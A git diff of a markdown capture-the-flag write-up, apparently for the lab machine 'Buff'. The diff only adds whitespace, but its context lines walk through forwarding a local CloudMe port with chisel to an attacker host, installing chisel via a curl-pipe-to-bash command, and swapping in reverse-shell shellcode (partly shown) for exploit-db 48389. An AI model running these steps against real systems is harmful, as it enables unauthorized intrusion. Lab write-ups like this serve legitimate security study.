@@ -142,6 +142,7 @@ Again , searching the software on **exploitdb** for a possible vulnerability lea
 ![cloudme](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/cloudme.png)
 
 By the first view, it seems like a **Buffer Overflow** vulnerability laying on **CloudMe** which should probably be listening on a local port on the machine. 
+
 We can confirm that by executing this command :
 ```
 C:\Users\shaun\Downloads>netstat -an | findstr "LISTENING"
@@ -162,6 +163,7 @@ It appears that the vulnerable software is listening under port **8888** on ``lo
 To remotely exploit it, We would need to use a software like **chisel** to forward the port on our own host and be able to start attacking.
 
 I'm going to download chisel.exe from [here](https://github.com/jpillora/chisel/releases/tag/v1.7.3) and upload on the target machine the same way I used to download netcat.
+
 You would also need to install **chisel** on your attacking machine by doing so : 
 ```sh
 root@kali:~# curl https://i.jpillora.com/chisel! | bash
@@ -181,6 +183,7 @@ C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.127:9999 R:8888:127.0.0.1:
 2020/11/22 16:07:15 client: Connected (Latency 512.4523ms)
 ```
 With everything already set-up now, We can try to attack the vulnerable software. 
+
 I'm going to use the exploit from [https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389) which requires some modifications such as changing the shellcode in order to match with our listening port and ip.
 
 ### Exploiting the vulnerable software
@@ -206,7 +209,9 @@ buf =  b""
 buf += b"\xbb\xc4\x1c\x1b\x3a\xda\xda\xd9\x74\x24\xf4\x5a\x29"
 [...]
 ```
+
 Lastly, Im going to replace the shellcode in the exploit with the one I just generated. 
+
 The final exploit code should look something like this :
 
 ```python
@@ -261,7 +266,9 @@ except Exception as e:
 
 ### Gaining system-shell
 
-Im going to save the modified exploit and run it using : ``python cloudme_exploit.py``. 
+Im going to save the modified exploit and run it using : 
+``python cloudme_exploit.py``. 
+
 Before executing remember that we also need to set up a listening port (the same we used while generating a shellcode) , in this case it would be **9002**
 
 ![admin](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/admin.png)
